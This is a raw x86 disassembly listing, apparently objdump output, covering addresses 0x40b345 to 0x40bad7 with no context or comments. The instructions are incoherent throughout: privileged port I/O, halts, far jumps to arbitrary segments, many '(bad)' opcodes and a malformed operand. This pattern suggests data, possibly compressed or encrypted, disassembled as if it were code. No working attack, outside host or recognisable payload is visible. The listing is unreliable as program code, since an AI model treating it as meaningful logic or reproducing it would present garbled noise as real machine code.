  40b345:	adc    eax,0xdfdf2fd0
  40b34a:	xor    esp,DWORD PTR [eax+0x43e5529]
  40b350:	loopne 0x40b37c
  40b352:	and    dl,0x41
  40b355:	pop    edi
  40b356:	hlt    
  40b357:	imul   esp,DWORD PTR ds:0xed737029,0xffffffdc
  40b35e:	mov    esi,DWORD PTR [edi-0x5ae7c577]
  40b364:	outs   dx,BYTE PTR ds:[esi]
  40b365:	mov    DWORD PTR [ebx-0x7681d48e],esi
  40b36b:	cmp    al,ah
  40b36d:	gs std 
  40b36f:	ja     0x40b3a9
  40b371:	repz sub BYTE PTR [ecx],bh
  40b374:	ss pushf 
  40b376:	sbb    eax,ecx
  40b378:	jge    0x40b2fb
  40b37a:	imul   esp,DWORD PTR [eax],0x3d2e9dd2
  40b380:	out    dx,al
  40b381:	push   ds
  40b382:	mov    ch,0xb6
  40b384:	dec    esp
  40b385:	inc    DWORD PTR [eax-0x53]
  40b388:	xor    DWORD PTR [edx],esp
  40b38a:	ret    0x57c8
  40b38d:	in     eax,0x28
  40b38f:	dec    ebx
  40b390:	sbb    ah,BYTE PTR [eax+0x9]
  40b393:	mov    cl,0xec
  40b395:	push   es
  40b396:	aam    0x9a
  40b398:	es pop ds
  40b39a:	push   ebx
  40b39b:	dec    ebp
  40b39c:	and    ecx,esi
  40b39e:	or     esi,0x63ea0f4f
  40b3a4:	jmp    0xa54a:0x3be427bb
  40b3ab:	mov    gs,ebx
  40b3ad:	adc    al,0xbd
  40b3af:	mov    ebx,0x9172f26b
  40b3b4:	and    al,0xc6
  40b3b6:	das    
  40b3b7:	enter  0x2803,0x7e
  40b3bb:	mov    bh,0xc9
  40b3bd:	sbb    eax,DWORD PTR [edx+esi*4+0x6f1942ed]
  40b3c4:	dec    ebp
  40b3c5:	enter  0xc33c,0xce
  40b3c9:	fmul   DWORD PTR [edi+0x20]
  40b3cc:	sub    bl,ch
  40b3ce:	fwait
  40b3cf:	sub    eax,0xc7d52b0c
  40b3d4:	mov    al,ds:0xe8d1141b
  40b3d9:	pop    ss
  40b3da:	xor    ah,bl
  40b3dc:	jmp    0x40b3c7
  40b3de:	jnp    0x40b45e
  40b3e0:	jp     0x40b3eb
  40b3e2:	jnp    0x40b3c1
  40b3e4:	cmc    
  40b3e5:	cmp    eax,0xcff6dc76
  40b3ea:	sti    
  40b3eb:	out    dx,eax
  40b3ec:	adc    dl,BYTE PTR [eax+ebp*1+0x68]
  40b3f0:	(bad)  
  40b3f1:	jne    0x40b3b5
  40b3f3:	pop    esi
  40b3f4:	jmp    0x40b3f8
  40b3f6:	mov    ebp,DWORD PTR [edx+0x874b0e4]
  40b3fc:	mov    ebx,0x91cae73f
  40b401:	imul   edi,DWORD PTR [eax],0x7e
  40b404:	push   ss
  40b405:	sar    DWORD PTR [edi+0x53],1
  40b408:	or     al,0x2
  40b40a:	call   0x74cd1c96
  40b40f:	pop    esi
  40b410:	jmp    0x40b436
  40b412:	sbb    al,0x1d
  40b414:	in     eax,0x79
  40b416:	lods   eax,DWORD PTR ds:[esi]
  40b417:	pop    ecx
  40b418:	int3   
  40b419:	int3   
  40b41a:	ror    eax,1
  40b41c:	icebp  
  40b41d:	in     eax,0xb7
  40b41f:	ins    BYTE PTR es:[edi],dx
  40b420:	add    ch,BYTE PTR [eax-0x4c]
  40b423:	push   cs
  40b424:	or     edx,DWORD PTR [edx+ebp*2-0x41]
  40b428:	out    dx,al
  40b429:	ja     0x40b4a6
  40b42b:	mov    bl,0x12
  40b42d:	pop    ds
  40b42e:	jmp    0x33c7:0xe2e35200
  40b435:	jp     0x40b483
  40b437:	xor    BYTE PTR [ebx+0x18],al
  40b43a:	pop    ss
  40b43b:	dec    ebx
  40b43c:	jmp    0x40b49c
  40b43e:	nop
  40b43f:	jnp    0x40b401
  40b441:	das    
  40b442:	ins    BYTE PTR es:[edi],dx
  40b443:	xor    al,dh
  40b445:	inc    ecx
  40b446:	mov    bl,0xce
  40b448:	test   al,0xe5
  40b44a:	mov    BYTE PTR [ecx],bl
  40b44c:	or     ebx,eax
  40b44e:	pop    ds
  40b44f:	cs inc ebp
  40b451:	mov    ds,WORD PTR [ecx+0x223b0ac9]
  40b457:	inc    ecx
  40b458:	sbb    eax,0xbb8ffcae
  40b45d:	test   eax,0x78e1fa76
  40b462:	aad    0xd2
  40b464:	call   0xbdf8:0xe7c90bfa
  40b46b:	or     BYTE PTR [ebx-0x75d152],al
  40b471:	cs push ecx
  40b473:	xor    DWORD PTR [ebx],ebp
  40b475:	add    eax,0x239a667b
  40b47a:	ja     0x40b444
  40b47c:	scas   al,BYTE PTR es:[edi]
  40b47d:	or     BYTE PTR [ebp+0x57],dl
  40b480:	in     eax,dx
  40b481:	inc    ecx
  40b482:	add    edi,ecx
  40b484:	jmp    0x40b4ee
  40b486:	mov    esi,edx
  40b488:	lea    eax,[eax]
  40b48a:	mov    esp,0x4ce0046f
  40b48f:	pushf  
  40b490:	xor    esp,edi
  40b492:	addr16 loope 0x40b4e7
  40b495:	xchg   ebp,eax
  40b496:	cld    
  40b497:	sbb    BYTE PTR [ebx-0x3af409ba],bl
  40b49d:	mov    ebx,0x61b6c8c1
  40b4a2:	and    al,0x35
  40b4a4:	jecxz  0x40b51c
  40b4a6:	inc    edx
  40b4a7:	or     edx,ebp
  40b4a9:	test   al,0x80
  40b4ab:	push   esp
  40b4ac:	mov    ebp,ebp
  40b4ae:	in     eax,dx
  40b4af:	pop    edi
  40b4b0:	jns    0x40b441
  40b4b2:	test   edi,eax
  40b4b4:	sbb    BYTE PTR [esi-0x2fdf9736],dl
  40b4ba:	push   es
  40b4bb:	cwde   
  40b4bc:	pushf  
  40b4bd:	aad    0xc2
  40b4bf:	push   eax
  40b4c0:	jmp    0x40b473
  40b4c2:	pop    eax
  40b4c3:	dec    ecx
  40b4c4:	shl    bl,1
  40b4c6:	xor    DWORD PTR [ebp+0x1e1bced8],esi
  40b4cc:	rcr    edi,0x3e
  40b4cf:	in     al,dx
  40b4d0:	cmp    eax,DWORD PTR [edi-0x13]
  40b4d3:	jge    0x40b495
  40b4d5:	fdivr  st,st(4)
  40b4d7:	sar    BYTE PTR ds:0x807aae6f,0xb8
  40b4de:	add    cl,al
  40b4e0:	xor    eax,0xab6047c4
  40b4e5:	into   
  40b4e6:	and    ah,BYTE PTR [ecx]
  40b4e8:	jmp    0x40b4bf
  40b4ea:	or     BYTE PTR [esi],dh
  40b4ec:	xor    bl,dh
  40b4ee:	int3   
  40b4ef:	cmp    BYTE PTR [ebp+0x7fe1d53b],cl
  40b4f5:	nop
  40b4f6:	jge    0x40b4e0
  40b4f8:	add    BYTE PTR [edx-0x47d502c0],dh
  40b4fe:	cld    
  40b4ff:	mov    BYTE PTR [edx-0x5e],ah
  40b502:	push   0xffffffb7
  40b504:	aaa    
  40b505:	cs jns 0x40b4d0
  40b508:	cmp    esp,edi
  40b50a:	jmp    FWORD PTR [edi-0x47]
  40b50d:	ins    DWORD PTR es:[edi],dx
  40b50e:	(bad)  
  40b50f:	and    edx,ebp
  40b511:	and    DWORD PTR [edx-0x8f61959],edx
  40b517:	or     dh,bl
  40b519:	jmp    0x4005:0xe9f901c0
  40b520:	jo     0x40b581
  40b522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b523:	stos   BYTE PTR es:[edi],al
  40b524:	pop    es
  40b525:	shl    BYTE PTR [edi-0x2fc2149b],1
  40b52b:	clc    
  40b52c:	inc    ecx
  40b52d:	adc    eax,0x580bab4
  40b532:	in     al,dx
  40b533:	dec    ebx
  40b534:	bound  ecx,QWORD PTR [ebp+0x7d4218fd]
  40b53a:	cmp    ah,BYTE PTR [ebx-0xa274299]
  40b540:	aas    
  40b541:	je     0x40b547
  40b543:	and    ebp,DWORD PTR [ebx]
  40b545:	lds    edx,FWORD PTR [edi]
  40b547:	ds mov eax,0x5ae11186
  40b54d:	xchg   esp,eax
  40b54e:	std    
  40b54f:	rol    BYTE PTR [edi],cl
  40b551:	jo     0x40b513
  40b553:	mov    DWORD PTR [ebx-0x61],esp
  40b556:	xchg   edi,eax
  40b557:	loopne 0x40b56f
  40b559:	adc    ch,bh
  40b55b:	xchg   ebp,esp
  40b55d:	xor    dh,BYTE PTR [edx]
  40b55f:	and    esi,esp
  40b561:	pop    edx
  40b562:	inc    ecx
  40b563:	enter  0xc7d3,0x79
  40b567:	xchg   esp,eax
  40b568:	pushf  
  40b569:	and    BYTE PTR [eax],al
  40b56b:	jno    0x40b558
  40b56d:	mov    ecx,0xa6de728e
  40b572:	sbb    ebp,eax
  40b574:	enter  0x4adf,0xbf
  40b578:	jno    0x40b564
  40b57a:	scas   al,BYTE PTR es:[edi]
  40b57b:	push   esi
  40b57c:	out    0x2a,al
  40b57e:	std    
  40b57f:	pop    esp
  40b580:	arpl   cx,bp
  40b582:	cwde   
  40b583:	jge    0x40b50c
  40b585:	out    0x21,al
  40b587:	mov    WORD PTR [eax],fs
  40b589:	push   edx
  40b58a:	std    
  40b58b:	adc    dh,BYTE PTR [eax+eax*1]
  40b58e:	push   ss
  40b58f:	hlt    
  40b590:	mov    bl,cl
  40b592:	add    ah,BYTE PTR [ecx]
  40b594:	cdq    
  40b595:	(bad)  
  40b596:	cld    
  40b597:	gs mov dl,0xc3
  40b59a:	in     eax,0x43
  40b59c:	test   edi,ebx
  40b59e:	jecxz  0x40b5a1
  40b5a0:	inc    esi
  40b5a1:	retf   0xb5d4
  40b5a4:	js     0x40b565
  40b5a6:	cld    
  40b5a7:	call   0xa103a336
  40b5ac:	cdq    
  40b5ad:	sbb    al,0x97
  40b5af:	enter  0xd70a,0x14
  40b5b3:	icebp  
  40b5b4:	pop    ebx
  40b5b5:	inc    esp
  40b5b6:	call   0xfd4bc15d
  40b5bb:	test   ecx,esi
  40b5bd:	in     al,0x22
  40b5bf:	lds    ebx,FWORD PTR [eax-0x48]
  40b5c2:	mov    ecx,eax
  40b5c4:	xchg   sp,ax
  40b5c6:	pushf  
  40b5c7:	push   cs
  40b5c8:	jmp    0xec1aea87
  40b5cd:	jne    0x40b5ad
  40b5cf:	pop    es
  40b5d0:	pop    ebx
  40b5d1:	jb     0x40b55e
  40b5d3:	cdq    
  40b5d4:	mov    bh,BYTE PTR [ebx]
  40b5d6:	ins    BYTE PTR es:[edi],dx
  40b5d7:	enter  0x9a77,0x16
  40b5db:	cmp    bh,BYTE PTR [ecx-0x14f194d4]
  40b5e1:	out    dx,al
  40b5e2:	inc    ebp
  40b5e3:	push   eax
  40b5e4:	aam    0x5b
  40b5e6:	in     eax,0x7a
  40b5e8:	cwde   
  40b5e9:	fsubr  st,st(4)
  40b5eb:	mov    ecx,0x5f3d13a1
  40b5f0:	pusha  
  40b5f1:	push   esp
  40b5f2:	aaa    
  40b5f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5f4:	in     al,dx
  40b5f5:	arpl   si,cx
  40b5f7:	rcl    BYTE PTR [eax+0x1cf1ad10],cl
  40b5fd:	dec    ebx
  40b5fe:	cdq    
  40b5ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b600:	dec    edx
  40b601:	fbstp  TBYTE PTR [esi+edi*1-0x54]
  40b605:	out    dx,al
  40b606:	addr16 mov ebp,0x20e481da
  40b60c:	sbb    BYTE PTR [edi-0x7b],0xd
  40b610:	arpl   WORD PTR ds:0xdfdccacd,si
  40b616:	jbe    0x40b619
  40b618:	test   al,0x9e
  40b61a:	xor    eax,0xfd6ed3fb
  40b61f:	push   edx
  40b620:	inc    ebp
  40b621:	fistp  DWORD PTR [eax+0x1027234b]
  40b627:	enter  0x61e0,0x66
  40b62b:	shl    ch,1
  40b62d:	imul   eax,DWORD PTR [ebp-0x44],0x382535e5
  40b634:	and    eax,0x33c8cd23
  40b639:	fild   DWORD PTR [eax+0x4f7bcb4c]
  40b63f:	add    ah,dh
  40b641:	xor    DWORD PTR fs:[eax+0x169cfc8a],0xffffffab
  40b649:	jecxz  0x40b68e
  40b64b:	enter  0x9ea2,0xdc
  40b64f:	xor    cl,ch
  40b651:	fiadd  WORD PTR [ecx]
  40b653:	sahf   
  40b654:	jmp    0x40b5f1
  40b656:	push   esi
  40b657:	push   ebp
  40b658:	or     esp,DWORD PTR [edi-0x207b9c96]
  40b65e:	ret    0x4bdb
  40b661:	mov    bl,0x18
  40b663:	pop    eax
  40b664:	stos   DWORD PTR es:[edi],eax
  40b665:	add    ch,bh
  40b667:	test   eax,0x957b7b69
  40b66c:	inc    ebx
  40b66d:	mov    ebx,0x587bc7b9
  40b672:	mov    esi,0xf9fe0417
  40b678:	dec    eax
  40b679:	xor    dl,BYTE PTR [ecx-0xc]
  40b67c:	xchg   DWORD PTR [edi-0x3],esi
  40b67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b680:	mov    esp,0xe1ef4a64
  40b685:	or     al,0x17
  40b687:	enter  0xcb2d,0x0
  40b68b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b68c:	shl    cl,0x18
  40b68f:	imul   esp,DWORD PTR [ecx],0xa6cfcd7
  40b695:	mov    cs,WORD PTR [ebp-0x76a25c81]
  40b69b:	enter  0xa6cb,0x71
  40b69f:	sub    al,0x49
  40b6a1:	sub    ch,BYTE PTR [edi-0x694e14a5]
  40b6a7:	mov    cl,0x4d
  40b6a9:	ins    DWORD PTR es:[edi],dx
  40b6aa:	mov    dl,BYTE PTR [eax]
  40b6ac:	imul   ebx,edi,0xc7a47b84
  40b6b2:	cmp    esi,DWORD PTR [ebx-0x1201dd3a]
  40b6b8:	popf   
  40b6b9:	pushf  
  40b6ba:	ret    0xde1f
  40b6bd:	jecxz  0x40b673
  40b6bf:	jmp    0x40b696
  40b6c1:	fistp  WORD PTR [ecx-0x842faa8]
  40b6c7:	out    dx,al
  40b6c8:	dec    ebp
  40b6c9:	mov    bh,0xf7
  40b6cb:	push   ecx
  40b6cc:	inc    ebp
  40b6cd:	rol    BYTE PTR [edi+0x48],0xaf
  40b6d1:	inc    esp
  40b6d2:	and    cl,BYTE PTR [ebp-0x294116dc]
  40b6d8:	fcomp  QWORD PTR [edi+0x3b0e3fce]
  40b6de:	jmp    FWORD PTR [edx-0x879b615]
  40b6e4:	cmp    al,0x8e
  40b6e6:	jecxz  0x40b6c9
  40b6e8:	int    0xdf
  40b6ea:	mov    ecx,0x5f8a78bb
  40b6ef:	cmp    DWORD PTR [ecx+0xbbffcd9],esi
  40b6f5:	add    ch,bl
  40b6f7:	mov    esi,DWORD PTR [edi+0x2a]
  40b6fa:	mov    cs:0x7f40ddd6,eax
  40b700:	rcl    edi,1
  40b702:	xor    ecx,DWORD PTR [ecx]
  40b704:	adc    eax,0xf247e2e9
  40b709:	jno    0x40b6b6
  40b70b:	adc    esp,DWORD PTR [ecx+esi*1-0x5896382b]
  40b712:	xchg   edi,eax
  40b713:	jle    0x40b69f
  40b715:	mov    bl,0x94
  40b717:	fwait
  40b718:	jmp    0x40b730
  40b71a:	pusha  
  40b71b:	jg     0x40b73b
  40b71d:	mov    ebp,0x4f31cb49
  40b722:	repnz mov edx,0xc89a8d04
  40b728:	and    eax,0x91f5e995
  40b72d:	push   0x7e5b95fe
  40b732:	and    BYTE PTR [eax-0x642d52a],0x27
  40b739:	fbstp  TBYTE PTR [ebx]
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	rcr    BYTE PTR [ebp+0x3b],0x4f
  40b740:	push   edi
  40b741:	pop    es
  40b742:	add    DWORD PTR [edi+ebx*8],edi
  40b745:	div    BYTE PTR [ebx+0x5c]
  40b748:	push   ss
  40b749:	jmp    DWORD PTR [edi-0x4a]
  40b74c:	(bad)  
  40b74d:	div    ebx
  40b74f:	(bad)  
  40b750:	adc    ah,BYTE PTR [ebx]
  40b752:	dec    esi
  40b753:	inc    ebp
  40b754:	cmp    esp,DWORD PTR [ecx-0x286acbdc]
  40b75a:	and    eax,0xb110eb59
  40b75f:	pop    ebx
  40b760:	jl     0x40b796
  40b762:	fwait
  40b763:	pop    edx
  40b764:	mov    eax,0xb6db46df
  40b769:	js     0x40b71b
  40b76b:	lds    edi,FWORD PTR [ebx]
  40b76d:	test   DWORD PTR [ecx],ebp
  40b76f:	xlat   BYTE PTR ds:[ebx]
  40b770:	jmp    0x40b7a3
  40b772:	add    eax,0x2d0ae397
  40b777:	lods   eax,DWORD PTR ds:[esi]
  40b778:	inc    edx
  40b779:	jmp    0x9f7ce12e
  40b77e:	cmp    dl,BYTE PTR [ebx]
  40b780:	push   ebp
  40b781:	mov    ah,0x10
  40b783:	mov    bh,0xeb
  40b785:	in     eax,dx
  40b786:	push   ebx
  40b787:	loope  0x40b73c
  40b789:	or     DWORD PTR [ebp+0x54dfe311],ecx
  40b78f:	retf   0x5b8
  40b792:	cmp    eax,0xfd128c83
  40b797:	fiadd  WORD PTR [edx-0x15]
  40b79a:	jmp    0x40b80c
  40b79c:	lock cdq 
  40b79e:	push   es
  40b79f:	out    0x64,al
  40b7a1:	mov    edi,0xfc59c43e
  40b7a6:	fld    QWORD PTR [edi+0x29]
  40b7a9:	cs xor bh,bh
  40b7ac:	jmp    0x40b733
  40b7ae:	sbb    bl,0x6d
  40b7b1:	clc    
  40b7b2:	adc    bh,BYTE PTR [eax]
  40b7b4:	mov    bh,bl
  40b7b6:	div    DWORD PTR [ecx-0x7694c1e0]
  40b7bc:	je     0x40b770
  40b7be:	std    
  40b7bf:	and    edi,DWORD PTR [ebx-0x7ea1dab2]
  40b7c5:	cdq    
  40b7c6:	mov    ah,0x76
  40b7c8:	sbb    eax,0xd907cbdf
  40b7cd:	lock test BYTE PTR [esi-0x7902dda6],al
  40b7d4:	fisttp WORD PTR [ebp+0x1d632536]
  40b7da:	push   ecx
  40b7db:	lahf   
  40b7dc:	mov    bl,bh
  40b7de:	sbb    BYTE PTR [ebx-0x71aa1cc9],dh
  40b7e4:	inc    edx
  40b7e5:	gs cld 
  40b7e7:	movlps xmm1,QWORD PTR [bx+si+0x5f]
  40b7ec:	ins    BYTE PTR es:[edi],dx
  40b7ed:	clc    
  40b7ee:	(bad)  
  40b7f0:	adc    ebp,DWORD PTR [esi-0x66]
  40b7f3:	enter  0x8743,0xc2
  40b7f7:	push   esi
  40b7f8:	loopne 0x40b860
  40b7fa:	rcl    DWORD PTR [esi-0x15],1
  40b7fd:	xchg   edx,eax
  40b7fe:	or     DWORD PTR [edi-0x3d],0xadc6bec5
  40b805:	fisttp WORD PTR [edi+0x21]
  40b808:	pop    ds
  40b809:	lea    edx,[ebx-0x3ce43f]
  40b80f:	loope  0x40b818
  40b811:	push   cs
  40b812:	retf   0x73f4
  40b815:	fbstp  TBYTE PTR [eax-0x33]
  40b818:	das    
  40b819:	call   FWORD PTR [esi-0x3539f71]
  40b81f:	dec    esp
  40b820:	push   edx
  40b821:	mov    ds:0xbd33f776,al
  40b826:	or     bl,0xfc
  40b829:	in     eax,0xf0
  40b82b:	das    
  40b82c:	stos   DWORD PTR es:[edi],eax
  40b82d:	aad    0xa4
  40b82f:	cmp    DWORD PTR [edi-0x4f9d0023],ebp
  40b835:	ja     0x40b849
  40b837:	push   esi
  40b838:	jecxz  0x40b851
  40b83a:	pop    ds
  40b83b:	inc    ebp
  40b83c:	pop    ebx
  40b83d:	inc    ecx
  40b83e:	sub    ecx,ebx
  40b840:	inc    ebx
  40b841:	cmp    al,bl
  40b843:	je     0x40b858
  40b845:	jne    0x40b7fc
  40b847:	jg     0x40b816
  40b849:	aas    
  40b84a:	add    al,0x71
  40b84c:	cmp    ch,bh
  40b84e:	jl     0x40b7ff
  40b850:	pushf  
  40b851:	add    al,0xc4
  40b853:	cwde   
  40b854:	shr    eax,cl
  40b856:	mul    BYTE PTR [edi+ecx*4+0x1f]
  40b85a:	xor    ch,ah
  40b85c:	adc    esp,DWORD PTR [ecx]
  40b85e:	pop    edi
  40b85f:	and    eax,0x37866beb
  40b864:	inc    esp
  40b865:	xlat   BYTE PTR ds:[ebx]
  40b866:	jae    0x40b874
  40b868:	xchg   ebx,eax
  40b869:	fbld   TBYTE PTR [ebx]
  40b86b:	ss hlt 
  40b86d:	or     al,0xfa
  40b86f:	retf   0xa91a
  40b872:	cld    
  40b873:	clc    
  40b874:	add    BYTE PTR [ecx],bl
  40b876:	jmp    0x40b8a4
  40b878:	push   esi
  40b879:	stos   BYTE PTR es:[edi],al
  40b87a:	mov    bh,0xc8
  40b87c:	pop    es
  40b87d:	std    
  40b87e:	pop    edx
  40b87f:	jg     0x40b804
  40b881:	icebp  
  40b882:	scas   al,BYTE PTR es:[edi]
  40b883:	add    ah,ch
  40b885:	dec    esi
  40b886:	ds or  eax,0x4e956e9e
  40b88c:	pop    es
  40b88d:	stc    
  40b88e:	test   eax,ecx
  40b890:	mov    bl,0xda
  40b892:	adc    DWORD PTR [edx-0x26c675e9],esp
  40b898:	jmp    0x40b904
  40b89a:	xor    ch,BYTE PTR [eax-0x31]
  40b89d:	xchg   esp,eax
  40b89e:	inc    edi
  40b89f:	jno    0x40b825
  40b8a1:	fild   WORD PTR [ebp+esi*8+0x189473e8]
  40b8a8:	and    DWORD PTR [ebx-0x2c218604],esi
  40b8ae:	and    al,0x2c
  40b8b0:	mov    ebx,gs
  40b8b2:	cmp    ecx,ebx
  40b8b4:	loopne 0x40b86d
  40b8b6:	and    ch,dh
  40b8b8:	mov    bl,0x4
  40b8ba:	lods   eax,DWORD PTR ds:[esi]
  40b8bb:	in     al,0xef
  40b8bd:	stos   DWORD PTR es:[edi],eax
  40b8be:	cld    
  40b8bf:	mov    ax,ds:0xa385a5c3
  40b8c5:	add    BYTE PTR [edi-0x38],0x42
  40b8c9:	push   esp
  40b8ca:	jmp    0xd4702968
  40b8cf:	sub    al,0xeb
  40b8d1:	inc    ecx
  40b8d2:	cmp    eax,0x5f9750f3
  40b8d7:	scas   eax,DWORD PTR es:[edi]
  40b8d8:	mov    edi,0x798fbd1f
  40b8dd:	shl    BYTE PTR ds:0x234eec28,cl
  40b8e3:	xor    al,0x9b
  40b8e5:	jo     0x40b934
  40b8e7:	mov    esp,0x52972cab
  40b8ec:	and    esi,ebx
  40b8ee:	and    BYTE PTR [ecx+0x79],ah
  40b8f1:	imul   eax,esi,0xffffffaf
  40b8f4:	js     0x40b919
  40b8f6:	cmp    eax,0xeb82eb28
  40b8fb:	div    cl
  40b8fd:	in     eax,dx
  40b8fe:	lock jb 0x40b8ea
  40b901:	fcomip st,st(4)
  40b903:	dec    edx
  40b904:	ins    DWORD PTR es:[edi],dx
  40b905:	xchg   ecx,eax
  40b906:	mov    dl,0xd7
  40b908:	push   ebx
  40b909:	or     ch,bh
  40b90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90c:	leave  
  40b90d:	push   ds
  40b90e:	or     cl,dh
  40b910:	mov    ds:0x41c86db0,al
  40b915:	inc    eax
  40b916:	adc    al,0x62
  40b918:	jnp    0x40b937
  40b91a:	xchg   DWORD PTR [edx+ebp*8+0x53],ecx
  40b91e:	fs mov bl,al
  40b921:	in     eax,dx
  40b922:	leave  
  40b923:	xor    BYTE PTR [esi],bl
  40b925:	jb     0x40b8e4
  40b927:	enter  0x2d4a,0xcd
  40b92b:	cmp    eax,0x52c4a9b9
  40b930:	out    dx,al
  40b931:	repz fadd DWORD PTR [bx+di-0x41]
  40b936:	fs jl  0x40b94f
  40b939:	addr16 push ecx
  40b93b:	enter  0x9bd6,0x1e
  40b93f:	cmp    al,0x9f
  40b941:	add    eax,0xbe97145
  40b946:	push   edx
  40b947:	cmp    bl,ah
  40b949:	dec    esi
  40b94a:	add    al,0x88
  40b94c:	loopne 0x40b985
  40b94e:	aad    0xc7
  40b950:	fwait
  40b951:	sahf   
  40b952:	jmp    DWORD PTR [ebp+0x7990662e]
  40b958:	jmp    0x40b8ef
  40b95a:	inc    esi
  40b95b:	ins    BYTE PTR es:[edi],dx
  40b95c:	arpl   WORD PTR [ebx+edi*2-0x75],bx
  40b960:	jo     0x40b940
  40b962:	jmp    0x39ed006f
  40b967:	xor    al,BYTE PTR [ebp-0x48736e61]
  40b96d:	add    bh,ch
  40b96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b970:	xchg   DWORD PTR [ebp-0x5eba21ed],ebp
  40b976:	push   edx
  40b977:	(bad)  
  40b978:	test   al,0xf0
  40b97a:	cmp    edx,esp
  40b97c:	ins    BYTE PTR es:[edi],dx
  40b97d:	aas    
  40b97e:	stos   DWORD PTR es:[edi],eax
  40b97f:	lods   eax,DWORD PTR ds:[esi]
  40b980:	jae    0x40b9e4
  40b982:	std    
  40b983:	je     0x40b9b6
  40b985:	mov    DWORD PTR [esi],esi
  40b987:	out    dx,al
  40b988:	mov    dl,ch
  40b98a:	out    dx,al
  40b98b:	(bad)  
  40b98c:	mov    edx,eax
  40b98e:	jmp    0xb92899a
  40b993:	sbb    DWORD PTR cs:[edx-0x2231c40e],ebp
  40b99a:	mov    WORD PTR [ebx+0x17e07254],gs
  40b9a0:	cdq    
  40b9a1:	inc    esp
  40b9a2:	jmp    0x9998af64
  40b9a7:	dec    eax
  40b9a8:	add    DWORD PTR [ebx-0x26e6d738],ebp
  40b9ae:	in     eax,0xfd
  40b9b0:	xchg   edx,eax
  40b9b1:	loopne 0x40b9e0
  40b9b3:	int    0x71
  40b9b5:	add    BYTE PTR [eax+0x13c7c3c8],bl
  40b9bb:	cmp    edi,ebp
  40b9bd:	fdivp  st(6),st
  40b9bf:	call   0x3293:0x3293a6d2
  40b9c6:	in     al,0xf3
  40b9c8:	clc    
  40b9c9:	inc    edi
  40b9ca:	std    
  40b9cb:	in     al,dx
  40b9cc:	repz dec ebx
  40b9ce:	dec    edi
  40b9cf:	shl    BYTE PTR [ebx+0x5b],0xec
  40b9d3:	(bad)  
  40b9d4:	jae    0x40b976
  40b9d6:	out    dx,eax
  40b9d7:	out    dx,eax
  40b9d8:	out    0x3f,al
  40b9da:	lods   eax,DWORD PTR ds:[esi]
  40b9db:	fmul   DWORD PTR [ebx]
  40b9dd:	sub    esp,edx
  40b9df:	mov    DWORD PTR [ecx],ecx
  40b9e1:	pop    edi
  40b9e2:	add    esi,DWORD PTR [esi-0x243dc7b5]
  40b9e8:	mov    eax,ds:0x7b0b75e0
  40b9ed:	inc    eax
  40b9ee:	xor    BYTE PTR [ecx+ecx*8+0x1f],0x19
  40b9f3:	fistp  WORD PTR [edx-0x2f930328]
  40b9f9:	hlt    
  40b9fa:	popa   
  40b9fb:	or     DWORD PTR [eax],eax
  40b9fd:	dec    ebx
  40b9fe:	cmc    
  40b9ff:	(bad)  
  40ba00:	cli    
  40ba01:	out    dx,al
  40ba02:	mov    ecx,0xfe3cb310
  40ba07:	add    BYTE PTR cs:[ecx+0x79],bl
  40ba0b:	ss sub edi,esp
  40ba0e:	mov    al,ds:0x4e590f48
  40ba13:	enter  0x23f5,0xe6
  40ba17:	inc    esp
  40ba18:	sub    eax,0xebed4b17
  40ba1d:	push   eax
  40ba1e:	pop    ss
  40ba1f:	test   al,0x3d
  40ba21:	xchg   edx,eax
  40ba22:	lods   eax,DWORD PTR ds:[esi]
  40ba24:	mov    eax,0xe5d9a8df
  40ba29:	adc    al,BYTE PTR [esi]
  40ba2b:	pusha  
  40ba2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba2d:	mov    esi,0x44d64cfc
  40ba32:	lock push eax
  40ba34:	cmp    dh,0x16
  40ba37:	enter  0xbdec,0x88
  40ba3b:	cmp    dh,BYTE PTR [esi-0x136ed063]
  40ba41:	and    al,0x40
  40ba43:	dec    esp
  40ba44:	into   
  40ba45:	jo     0x40ba3b
  40ba47:	inc    ebx
  40ba48:	or     edi,DWORD PTR [eax+0xb]
  40ba4b:	mov    esi,0x88c5dbfc
  40ba50:	inc    eax
  40ba51:	lea    ebx,[eax]
  40ba53:	mov    ebx,0xf8fcd0d8
  40ba58:	mov    ch,0x1d
  40ba5a:	mov    al,ds:0x2d516431
  40ba5f:	sbb    al,0x83
  40ba61:	fisttp WORD PTR [ebp-0x16]
  40ba64:	cmp    BYTE PTR [edi],dh
  40ba66:	mov    dh,0x50
  40ba68:	iret   
  40ba69:	mov    ?,esi
  40ba6b:	repnz dec edi
  40ba6d:	shl    ebx,1
  40ba6f:	sub    DWORD PTR [esi+0x5],esi
  40ba72:	lds    edx,FWORD PTR [ecx-0x351120eb]
  40ba78:	aas    
  40ba79:	cmp    DWORD PTR [ecx],eax
  40ba7b:	jno    0x40bad0
  40ba7d:	push   0x10
  40ba7f:	popf   
  40ba80:	(bad)  
  40ba81:	(bad)  
  40ba82:	cld    
  40ba83:	pop    edx
  40ba85:	call   0xea68c9e6
  40ba8a:	(bad)
  40ba8d:	imul   esp,DWORD PTR [edx+0x125f46bf],0x9b422cec
  40ba97:	dec    ebx
  40ba98:	jmp    0x7a97:0x682a5efa
  40ba9f:	push   ecx
  40baa0:	add    DWORD PTR [eax+edx*8+0x4cc23610],eax
  40baa7:	sbb    al,0x32
  40baa9:	xor    eax,0x19c1c829
  40baae:	and    al,0x38
  40bab0:	jl     0x40bb14
  40bab2:	test   BYTE PTR ds:0x65b750ee,bl
  40bab8:	test   eax,0xe5d7f6df
  40babd:	fsubp  st(1),st
  40babf:	(bad)  
  40bac0:	adc    DWORD PTR [edx],esi
  40bac2:	stos   BYTE PTR es:[edi],al
  40bac3:	sub    BYTE PTR [ebx],ch
  40bac5:	or     al,0xc9
  40bac7:	retf   
  40bac8:	jmp    0x40ba4e
  40baca:	adc    ecx,DWORD PTR ss:[edx-0x15]
  40bace:	popa   
  40bacf:	push   esi
  40bad0:	inc    eax
  40bad1:	fstp   TBYTE PTR [eax+0x5f731e9b]
  40bad7:	cwde   
